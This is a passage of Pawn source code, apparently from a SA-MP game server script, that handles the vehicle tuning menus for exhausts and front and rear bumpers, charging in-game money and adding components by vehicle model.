					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 567)
					{
					    AddVehicleComponentEx(car,1132);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Locos Low Slamin.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 536)
					{
					    AddVehicleComponentEx(car,1105);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Locos Low Slamin.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 535)
					{
					    AddVehicleComponentEx(car,1114);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Locos Low Slamin.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 576)
					{
					    AddVehicleComponentEx(car,1135);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Locos Low Slamin.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
     			}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nCores\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nRodas\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
            }
			if(listitem == 4)//BACK
            {
                 ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nCores\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nRodas\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
            }
   		}
	}
   	if(dialogid == DIALOG_TUNNING+4)//Front Bumpers
   	{
		if(response)
		{

			if(GetPlayerMoneyEx(playerid) < 20000)
   			{
      			SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        	return 1;
     		}
			if(listitem == 0)//Wheel Arch Cars Alien Front Bumper
			{
   				if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560)
				{
       				GivePlayerMoneyEx(playerid, -20000);

		            if(GetVehicleModel(car) == 562)
		            {
		            	AddVehicleComponentEx(car,1171);
		            	PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	              		SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien front bumper.");
		            	ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 565)
					{
					    AddVehicleComponentEx(car,1153);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 559)
					{
					    AddVehicleComponentEx(car,1160);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 561)
					{
					    AddVehicleComponentEx(car,1155);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 560)
					{
					    AddVehicleComponentEx(car,1169);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 558)
					{
					    AddVehicleComponentEx(car,1166);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
				 	    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Select", "Exit");
     			}
            }
			if(listitem == 1)//Wheel Arch Cars X-Flow Front Bumper
            {
            	if(GetVehicleModel(car) == 562 ||
             	GetVehicleModel(car) == 565 ||
	            GetVehicleModel(car) == 559 ||
             	GetVehicleModel(car) == 561 ||
                GetVehicleModel(car) == 560)
	           	{
					GivePlayerMoneyEx(playerid, -20000);

			        if(GetVehicleModel(car) == 562)
			        {
			            AddVehicleComponentEx(car,1172);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow front bumper.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 565)
					{
					    AddVehicleComponentEx(car,1152);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 559)
					{
					    AddVehicleComponentEx(car,1173);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 561)
					{
					    AddVehicleComponentEx(car,1157);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 560)
					{
					    AddVehicleComponentEx(car,1170);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 558)
					{
					    AddVehicleComponentEx(car,1165);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
		    }
			if(listitem == 2)//Locos Low Co. Car Chromer Front Bumper
            {
                if(GetVehicleModel(car) == 575 ||
				GetVehicleModel(car) == 534 ||
				GetVehicleModel(car) == 567 ||
				GetVehicleModel(car) == 536 ||
				GetVehicleModel(car) == 576 ||
				GetVehicleModel(car) == 535)
				{
					GivePlayerMoneyEx(playerid, -20000);

			        if(GetVehicleModel(car) == 575)
			        {
			            AddVehicleComponentEx(car,1174);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chromer front bumper.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Select", "Exit");
					}
					else if(GetVehicleModel(car) == 534)
					{
					    AddVehicleComponentEx(car,1179);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chromer front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Select", "Exit");
					}
					else if(GetVehicleModel(car) == 567)
					{
					    AddVehicleComponentEx(car,1189);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chromer front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Select", "Exit");
					}
					else if(GetVehicleModel(car) == 536)
					{
					    AddVehicleComponentEx(car,1182);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chromer front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 535)
					{
					    AddVehicleComponentEx(car,1115);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chromer front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 576)
					{
					    AddVehicleComponentEx(car,1191);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chromer front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
     			}
				else
				{
    				SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
			}
			if(listitem == 3)//Locos Low Co. Salmin Front Bumper
            {
                if(GetVehicleModel(car) == 575 ||
				GetVehicleModel(car) == 534 ||
				GetVehicleModel(car) == 567 ||
				GetVehicleModel(car) == 536 ||
	            GetVehicleModel(car) == 576 ||
				GetVehicleModel(car) == 576)
			    {
			    	GivePlayerMoneyEx(playerid, -20000);

			        if(GetVehicleModel(car) == 575)
			        {
			            AddVehicleComponentEx(car,1175);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Slamin front bumper.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 534)
					{
					    AddVehicleComponentEx(car,1185);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Slamin front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 567)
					{
					    AddVehicleComponentEx(car,1188);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Slamin front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 536)
					{
					    AddVehicleComponentEx(car,1181);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Slamin front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
                    else if(GetVehicleModel(car) == 535)
					{
					    AddVehicleComponentEx(car,1116);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Slamin front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 576)
					{
					    AddVehicleComponentEx(car,1190);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Slamin front bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
     			}
            }
			if(listitem == 4)//BACK
            {
                 ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
            }
        }
   	}
   	if(dialogid == DIALOG_TUNNING+5)//Rear Bumpers
   	{
		if(response)
		{

			if(GetPlayerMoneyEx(playerid) < 20000)
   			{
      			SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        	return 1;
     		}
			if(listitem == 0)//Wheel Arch Cars Alien Rear Bumper
			{
                if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560)
		        {
		        	GivePlayerMoneyEx(playerid, -20000);

		            if(GetVehicleModel(car) == 562)
		            {
		            	AddVehicleComponentEx(car,1149);
		            	PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	              		SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien rear bumper.");
		            	ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 565)
					{
					    AddVehicleComponentEx(car,1150);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 559)
					{
					    AddVehicleComponentEx(car,1159);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 561)
					{
					    AddVehicleComponentEx(car,1154);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 560)
					{
					    AddVehicleComponentEx(car,1141);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 558)
					{
					    AddVehicleComponentEx(car,1168);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
				 	    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nNext page", "Selecionar", "Sair");
				}
            }
			if(listitem == 1)//Wheel Arch Cars X-Flow Rear Bumper
            {
                if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560)
		        {
					GivePlayerMoneyEx(playerid, -20000);

			        if(GetVehicleModel(car) == 562)
			        {
			            AddVehicleComponentEx(car,1148);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch  X-Flow rear bumper.");
		                ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 565)
					{
					    AddVehicleComponentEx(car,1151);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch  X-Flow rear bumper.");
				        ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 559)
					{
					    AddVehicleComponentEx(car,1161);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch  X-Flow rear bumper.");
				        ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 561)
					{
					    AddVehicleComponentEx(car,1156);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch  X-Flow rear bumper.");
				        ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 560)
					{
					    AddVehicleComponentEx(car,1140);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch  X-Flow rear bumper.");
				        ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 558)
					{
					    AddVehicleComponentEx(car,1167);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch  X-Flow rear bumper.");
				        ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
            }
			if(listitem == 2)//Locos Low Co. Cars Chromer Rear Bumper
            {
                if(GetVehicleModel(car) == 575 ||
				GetVehicleModel(car) == 534 ||
				GetVehicleModel(car) == 567 ||
				GetVehicleModel(car) == 536 ||
				GetVehicleModel(car) == 576 ||
				GetVehicleModel(car) == 535)
			    {
			    	GivePlayerMoneyEx(playerid, -20000);

			        if(GetVehicleModel(car) == 575)
			        {
			            AddVehicleComponentEx(car,1176);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chromer rear bumper.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Select a Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 534)
					{
					    AddVehicleComponentEx(car,1180);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chromer rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Select a Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 567)
					{
					    AddVehicleComponentEx(car,1187);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chromer rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Select a Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 536)
					{
					    AddVehicleComponentEx(car,1184);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chromer rear bumper.");
